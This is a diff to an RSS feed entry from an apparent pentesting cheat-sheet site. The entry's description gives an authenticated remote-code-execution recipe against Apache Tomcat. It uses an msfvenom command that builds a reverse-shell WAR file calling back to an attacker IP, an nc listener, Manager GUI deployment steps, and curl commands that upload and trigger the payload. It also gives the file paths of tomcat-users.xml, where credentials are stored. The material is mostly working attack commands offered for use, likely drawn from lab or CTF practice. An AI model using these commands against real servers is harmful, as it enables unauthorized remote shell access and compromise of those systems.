@@ -19,7 +19,7 @@
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description> RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ </description>
+      <description> Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war # Open a nc listener rlwrap nc -lvnp 1337 Manager GUI +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ Manager Script curl -u &amp;#39;username:password&amp;#39; http://10.10.11.10:8080/manager/text/deploy?path=/revshell --upload-file revshell.war curl -s http://10.10.11.10:8080/revshell </description>
     </item>
   </channel>
 </rss>
